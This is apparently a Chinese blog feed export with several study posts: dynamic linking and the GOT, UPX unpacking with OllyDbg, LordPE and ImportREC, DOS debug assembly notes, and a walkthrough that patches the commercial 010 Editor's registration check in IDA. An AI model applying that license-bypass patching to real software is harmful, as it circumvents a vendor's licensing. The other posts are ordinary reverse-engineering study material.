<p>许多程序拥有相同的功能，如果程序都重复的包含这些代码，将浪费很多硬盘空间。<img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821102949.png"></p>
<p>程序1.exe 、2.exe 、3.exe有一段代码是相同的，那么我们可以将橙色这段代码从这三个程序中提取出来，保存成一个独立的动态链接库，等到程序运行的时候再将它们加载到内存。<img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821103253.png"></p>
<p>假设源程序每个都是100M，共享的这段是50M，那么之前占硬盘300M，使用动态连接后占200M。其实动态链接库不仅可以节约空间，还更加方便程序的升级和维护。</p>
<h3 id="创建动态链接库"><a href="#创建动态链接库" class="headerlink" title="创建动态链接库"></a><strong>创建动态链接库</strong></h3><p>创建matc.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>math.h</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br></pre></td></tr></table></figure>

<p>将math.c编译成一个动态库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC math.c -o libmath.so</span><br></pre></td></tr></table></figure>

<ul>
<li>-shared 选项是表明这是一个动态库</li>
<li>-fPIC 位置无关代码（后面会讲）</li>
<li>libmath.so是我们定义的名字</li>
</ul>
<p>主程序main.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;math.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;add(1,2) return %d&quot;</span>,add(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译整个程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc main.c -lmath -L. -o main</span><br></pre></td></tr></table></figure>

<ul>
<li>-l指定动态链接库math，math是libmath.so,省略了lib和so后缀</li>
<li>-L指定动态链接库所在的目录</li>
</ul>
<p>还不能直接运行程序</p>
<p><img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821105924.png"></p>
<p>会报错找不到动态链接库，这是因为linux默认回去系统路径下搜索动态库，我们使用环境变量，将当前目录添加到LD_LIBRARY_PATH环境变量中，这样操作系统就会先去我们指定的目录搜索，如果没有则会继续前往系统路径搜索。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=&quot;$(pwd)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821110426.png"></p>
<p>成功！！！！ </p>
<p>动态链接区别于静态链接的一点是方便升级和维护，此时我们只需修改math.c重新编译libmath，即可更改程序功能,非常的方便。将math.c修改</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;you have changed the DLL\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821111411.png"></p>
<h3 id="动态链接与静态链接的区别"><a href="#动态链接与静态链接的区别" class="headerlink" title="动态链接与静态链接的区别"></a>动态链接与静态链接的区别</h3><p><strong>静态链接</strong>将所有用到的库和模块合并成一个独立的可执行文件，这一过程需要修复各个模块的函数跳转地址（重定位），因为在链接之前那些跳转地址不过是一堆占位符而已。</p>
<p><img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821112315.png"></p>
<p>对于 <strong>动态链接</strong> ，链接过程发生在程序加载时，在我们运行一个依赖动态链接库的程序，操作系统会首先将程序的数据、代码、连同用到的动态链接库<strong>递归的</strong>加载到内存，每个动态链接库的加载地址都是不固定的，操作系统会根据当前地址空间的使用情况为他们动态的分配一段内存。当动态链接库固定之后，就要进行修复函数的跳转地址，<img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821113103.png"></p>
<p>因为动态链接库位置是不固定的，所以我们不能直接修改代码段，如果这样的话我们需要在不同的进程中保存不同的副本，显然是不合理的。于是在数段预留了一片区域存放跳转地址，被称为GOT(全局偏移表)，在调用函数时首先会查表，然后根据表中的地址跳转，got的地址在动态链接库加载的时候会被修改为真正的地址，每个进程中的got都不相同，但是got所占用的空间很小可以忽略。这种方式被称为PIC（地址无关代码）。</p>
<p><img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821114109.png"></p>
<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>在程序运行的时候库中的很多函数都没有被调用，操作系统为了进一步的降低开销，不直接加载所有的函数，而是用到哪个函数的时候在进行查表搜索。</p>
<p><a href="https://www.youtube.com/watch?v=QUaSgq-ivbw">搬运的视频内容</a></p>
]]></content>
      <tags>
        <tag>DLL</tag>
      </tags>
  </entry>
  <entry>
    <title>压缩壳原理即对坑-UPX为例</title>
    <url>/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/</url>
    <content><![CDATA[<h3 id="什么是壳"><a href="#什么是壳" class="headerlink" title="什么是壳"></a>什么是壳</h3><p>壳，分为<strong>压缩壳</strong>，<strong>保护壳</strong>，<strong>伪装壳</strong>（对抗杀毒软件）</p>
<p>这篇文章讲以下压缩壳，压缩壳可以有效减少程序的体积，同时由于压缩之后的代码比较难懂，所以也有一定的保护作用，最常见的就是UPX壳。压缩壳不同于一般的压缩（7zp、rar等），它不需要解压缩操作，程序可以直接运行，用到的是一种<strong>运行时解压缩</strong>技术。</p>
<span id="more"></span>

<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20230621022516.png"></p>
<p>运行加壳程序，操作对象是notepad.exe，运行得到new.exe程序，大小从67584变为了48128字节。</p>
<p>这是notepad.exe对应的</p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231007173949.png"></p>
<p>这是new.exe对应的<img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231007174057.png"></p>
<p>加入的upx代码的作用是将2、3、4解压缩（还原）为7、8、9，并不影响程序的运行。在我们运行程序的瞬间2、3、4被还原为7、8、9。</p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231007181711.png"></p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231007182006.png"></p>
<p>可以看到，啥都看不到，看到的这些就是上文提到的2、3、4就是压缩之后的代码。壳可以手动脱也可以用脱壳机一键脱，当然脱不下来的话就要上手了。</p>
<h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><h4 id="机脱"><a href="#机脱" class="headerlink" title="机脱"></a>机脱</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">win+r</span><br><span class="line">d：/</span><br><span class="line">cd tools（upx文件夹所在的文件夹）</span><br><span class="line">cd upx</span><br><span class="line">upx.exe</span><br><span class="line">upx -d 程序名</span><br></pre></td></tr></table></figure>

<p>如果成功则程序直接发生更改，如果出现红色的字体则说明没有脱壳成功。</p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20230404113409.png"></p>
<h4 id="手脱"><a href="#手脱" class="headerlink" title="手脱"></a>手脱</h4><p>手脱的工具需要</p>
<ul>
<li>ollydbg</li>
<li>lordpe  （在xp环境，反正win11不行）</li>
<li>ImportREC  （修复IAT）</li>
</ul>
<p>我们将有壳的程序拖入od他会弹出这个窗口，我们知道他是有壳的，所以不需要他继续分析啦，直接点否。</p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010184402.png"></p>
<p>这段代码是壳的开始</p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010184802.png"></p>
<p>我们知道壳的原理是运行时解压缩，壳这段操作实际上是在对压缩的原始程序进行解压随，对一段数据进行操作难免会用到循环，循环就会往上跳转，所以我们遇到向上跳转的汇编指令直接跳过，直接结束循环而不是进入循环（跳过的意思是一瞬间执行完所有循环）<img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010185154.png"></p>
<p>可以看到jb这条指令会向上跳转，我们单机下面的mov指令然后F4（运行到），同理遇到jmp，jz，jnz一旦往上跳转我么都F4，需要注意的是call指令我们也不进入而是直接跳过。原因是我们会进入call调用的那个函数，容易迷失。</p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010185519.png"></p>
<p>upx以及很多壳的一个明显特征是结尾有个大跳转<img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010185730.png"></p>
<p>跳转的这个位置25DDAC就是OEP了，然后进行dump,用到的工具是lordpe，首先右键一下当前进程，点击修复大小。</p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010233637.png"></p>
<p>然后右键选择完整转存，保存文件。运行</p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010234100.png"></p>
<p>哈哈哈，这是什么情况呢？我们需要修复一下IAT（import address table 导入地址表），要用到的工具是ImportREC，首先在importrec中选择未脱壳的进程(它的IAT是正确的)，注意这里的OEP要改成OPE的相对偏移地址，也就是OD看到的地址减去基地址0x400000得到1DDAC，然后点击<strong>自动查找IAT</strong>，接着<strong>获取输入表</strong>，最后选择<strong>转储到文件</strong>，转储的文件选择之前dump出来的那个文件，这就是修复IAT的过程。</p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011002203.png"></p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011002614.png"></p>
<p>左边是脱壳之后的文件直接拖进od的结果，右边的是我们单步调试的带壳程序，并且脱完壳的程序是可以正常运行的，脱壳成功。<img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011004257.png"></p>
<p>壳是脱完了，但是你是否有一个疑问，为什么要修复IAT?下面我们来了解一下</p>
<h3 id="修复IAT"><a href="#修复IAT" class="headerlink" title="修复IAT"></a>修复IAT</h3><p>来自知乎大佬的一句总结 ”不论是压缩壳还是加密壳，在脱壳过程中都需要修复IAT，因为<strong>脱壳时会将内存中的数据转储 (dump)到本地，保存成文件，而IAT在文件中是一个RVA数组，在内存中是一个函数地址数组</strong>。我们需要将转储出来的文件中的IAT修复成RVA数组的形式，这样程序才算是恢复。“ </p>
<p>这里接上之前学习<a href="https://fishjump-my.github.io/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/#more">PE的知识</a><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011011721.png"></p>
<p>IAT相当于一个进货清单，描述pe文件引用了哪些文件&#x2F;函数。在脱壳过程中，由于壳的修改，原来的IAT表项已经是无效的，无法正确识别真正的外部函数或模块。</p>
<p>修复IAT步骤：</p>
<ul>
<li>识别IAT表项：根据（未脱壳）程序的结构和特征，识别出加壳程序中被修改的IAT表项。对应的操作是”自动查询”IAT“</li>
<li>构建正确的IAT：根据原始的可执行文件，构建正确的IAT表项，使其能正确指向外部函数或模块。对应“获取IAT”</li>
<li>更新IAT表项：将构建好的IAT表项写入到程序中，覆盖原来呜嗷的表项，实现修复。对应“转储到文件”</li>
</ul>
<h3 id="OEP"><a href="#OEP" class="headerlink" title="OEP"></a>OEP</h3><p>什么是OEP呢，就是函数真正的入口。</p>
<p>下面我们多了解以下OEP的特征，毕竟如果不认识OEP的话，就算我们脱下了壳，也不知道自己成功了。直接偷懒截大佬们的文章了</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">OEP：(Original <span class="keyword">Entry</span> Point)，程序的原始入口点。</span><br></pre></td></tr></table></figure>

<p><strong>VS特点</strong>：CALL和JMP,CALL进去之后调用的API是相同的<img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011022742.png"></p>
<p><strong>Delphi特点</strong>:</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">esp</span>,-<span class="number">0x10</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,xxx</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011023348.png"></p>
<p>QT特点：</p>
<p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011023957.png"></p>
<p>本篇文章是拿最简单的壳开刀的，但是大致套路就是这样的，所谓万变不离其宗</p>
<p>参考链接：</p>
<p><a href="https://www.52pojie.cn/thread-1640646-1-1.html">各种程序的OEP入口特征汇总整理!专为小白总结！ - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://www.52pojie.cn/thread-234739-1-1.html">【初学者教程】破解基础知识之认识壳与程序的特征 - 『脱壳破解讨论求助区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/34263050#:~:text=%E8%84%B1%E5%A3%B3%E4%B8%AD%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E4%B8%80%E6%AD%A5%EF%BC%8C%E4%B8%8D%E8%AE%BA%E6%98%AF%E5%8E%8B%E7%BC%A9%E5%A3%B3%E8%BF%98%E6%98%AF%E5%8A%A0%E5%AF%86%E5%A3%B3%EF%BC%8C%E5%9C%A8%E8%84%B1%E5%A3%B3%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%83%BD%E9%9C%80%E8%A6%81%E4%BF%AE%E5%A4%8DIAT%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%84%B1%E5%A3%B3%E6%97%B6%E4%BC%9A%E5%B0%86%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E8%BD%AC%E5%82%A8,(dump)%E5%88%B0%E6%9C%AC%E5%9C%B0%EF%BC%8C%E4%BF%9D%E5%AD%98%E6%88%90%E6%96%87%E4%BB%B6%EF%BC%8C%E8%80%8CIAT%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%AD%E6%98%AF%E4%B8%80%E4%B8%AARVA%E6%95%B0%E7%BB%84%EF%BC%8C%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E6%98%AF%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E6%95%B0%E7%BB%84%E3%80%82">使用x64dbg脱壳之开源壳upx - 知乎 (zhihu.com)</a></p>
<p>[<a href="https://bbs.kanxue.com/thread-226967.htm">原创]脱壳步骤，修复IAT的原因及修复IAT的完整步骤-加壳脱壳-看雪-安全社区|安全招聘|kanxue.com</a></p>
]]></content>
      <tags>
        <tag>UPX</tag>
        <tag>运行时压缩</tag>
        <tag>壳</tag>
      </tags>
  </entry>
  <entry>
    <title>破解010Editor</title>
    <url>/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/</url>
    <content><![CDATA[<p>刚开始学安全的时候，以为逆向就是软件破解hhh，学习了也有段时间了，挑个软柿子捏捏吧。</p>
<p>去官网按照自己的需求下载</p>
<span id="more"></span>![](破解010Editor/QQ截图20230730115114.png)

<p>我是win64</p>
<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730115747.png"></p>
<p>不知道什么原因哈，我这个一打开是这样的，应为是破解完才写的博客，这个是我重新下载的一个，看这个名字和密码也是我之前随便输入的，不重要，直接上ida。</p>
<p>直接字符串搜索，就搜索下面的文本就行“thank you”<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120246.png"></p>
<p>双击之后x交叉引用<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120302.png"></p>
<p>进入了流程图界面，按一下tab即可进入伪代码界面，代码不多，翻找一下即可找到<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120429.png"></p>
<p>也就是v17只要满足这个判断就说明我们成功了。什么？你问为什么？</p>
<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120606.png"></p>
<p>现在知道了吧hhh找到最近的v17点进去看看<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120710.png"></p>
<p>我们只要使这个函数的返回值等于219即可，进入之后我们可以看到很多判断和ruturn<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120814.png"></p>
<p>查看流程图更加明了一点</p>
<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121003.png"></p>
<p>直接从头开始，jz代表的是判断为0则跳转	，对应的就是这里<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121106.png"></p>
<p>最简单的就是去掉这个判断条件，直接让他return然后把return的值修改一下即可。按空格进入汇编页面，选中jz那里（要多选择一行）然后右键点击fill with nops就行啦</p>
<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121528.png"></p>
<p>修改之后整个函数就变得简单啦<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121710.png"></p>
<p>再次查看刚在那个有很多return的函数发现变成这样了<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121753.png"></p>
<p>然后我们将这个275修改成219</p>
<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121935.png"></p>
<p>就ok啦。最后edit–&gt;patch program –&gt;apply patch to input file</p>
<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122208.png"></p>
<p>出现了一个permisson denied，拒绝访问，查了一下多是linux系统中权限的问题，好像换一个盘符也可以解决，我摸索了一下，直接将刚才下载的010Editor.exe复制到别的地方，不在原来的目录即可</p>
<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122808.png"></p>
<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122841.png"></p>
<p>然后这里的地址修改一下<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122912.png"></p>
<p>出现<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122558.png"></p>
<p>这个就算大功告成啦</p>
<p>然后将这个更改后的程序复制到之前的目录，选择替换即可<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730123134.png"></p>
<p>点击help –&gt; about 随意输入即可</p>
<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730123059.png"></p>
<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730123105.png"></p>
<p>其是毫无难度，应该也可以找到加密函数写注册机啥的。其实感觉这一年的学习下来，学会的最重要的技能就是使用搜索引擎了，遇到什么问题都不至于太慌乱，可以想象，要是之前的我遇到种种报错和权限问题肯定慌得不行，现在第一反应就是取edge一下，再不行就Google一下，再不行就问一下学长。加油！！！</p>
<p>参考：</p>
<p><a href="https://www.bilibili.com/read/cv12423453/">https://www.bilibili.com/read/cv12423453/</a></p>
]]></content>
  </entry>
  <entry>
    <title>汇编语言</title>
    <url>/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<p>​       </p>
<h1 id="debug中的常用命令"><a href="#debug中的常用命令" class="headerlink" title="debug中的常用命令"></a>debug中的常用命令</h1><ul>
<li><p>g 加地址，直接跳转至此处，前面全部执行 </p>
</li>
<li><p>u 将内存中的机器指令翻译成汇编指令</p>
</li>
<li><p>t 执行一条指令</p>
<span id="more"></span>
</li>
<li><p>r 查看寄存器中的值，同时显示出下一条要执行的指令，还可以改变寄存器中的内容，比如r ax，然后弹出冒号，输入即可</p>
</li>
<li><p>d 查看内存中的内容，d 段地址：偏移地址 (可以在此处加上想查看的范围，默认是128字节)，之后再按d显示后续内容</p>
</li>
<li><p>p 可以跳过loop循环</p>
</li>
<li><p>e 向内存单元写入命令，e 段地址:偏移地址 B8 01 00,即向该内存写入mov ax,1命令</p>
</li>
</ul>
<h1 id="第7章-更灵活的定位内存地址的方法"><a href="#第7章-更灵活的定位内存地址的方法" class="headerlink" title="第7章 更灵活的定位内存地址的方法"></a>第7章 更灵活的定位内存地址的方法</h1><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230313180808.png"></p>
<p>话不多说，直接上图，完成了任务。只不过忘掉了如何一次性执行完循环，一直t加回车，头皮发麻。这一题是让我们补充codesg段的代码，我们要灵活的利用栈来存储和释放cx</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230313181241.png"></p>
<p>s0处的push cx是将外层循环的cx值压入栈中，然后往下执行，mov cx,4设置内层循环次数，执行完4次s1后，此时的cx值为零，将之前cx的值弹出栈，恢复为3(即4-1)，然后往复执行。</p>
<h5 id="tips-快速结束循环"><a href="#tips-快速结束循环" class="headerlink" title="tips 快速结束循环"></a>tips 快速结束循环</h5><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230313182253.png"></p>
<p>再补充一个快速的指令 g 偏移地址，例如g 0012执行后，ip&#x3D;0012，从此处开始往下执行。</p>
<h1 id="第8章-数据处理的两个基本问题"><a href="#第8章-数据处理的两个基本问题" class="headerlink" title="第8章 数据处理的两个基本问题"></a>第8章 数据处理的两个基本问题</h1><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230315004402.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230315004456.png"></p>
<p>只有上述形式是是正确的，有个小要点，[bp]默认的段地址是ss。</p>
<h5 id="指令要处理的数据有多长"><a href="#指令要处理的数据有多长" class="headerlink" title="指令要处理的数据有多长"></a>指令要处理的数据有多长</h5><p>这是我们必须指出的，可以显性地指出也可以隐形的指出，比如在有寄存器名称的情况下我们可以判断出访问的是字单元还是字节单元，在没有寄存器参与的情况下用操作符X ptr指明长度。X为byte或word。对于push [1000]这样的指令则无需指明，因为push指令只进行字操作。</p>
<h3 id="实验-7"><a href="#实验-7" class="headerlink" title="实验 7"></a>实验 7</h3><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230322200528.png"></p>
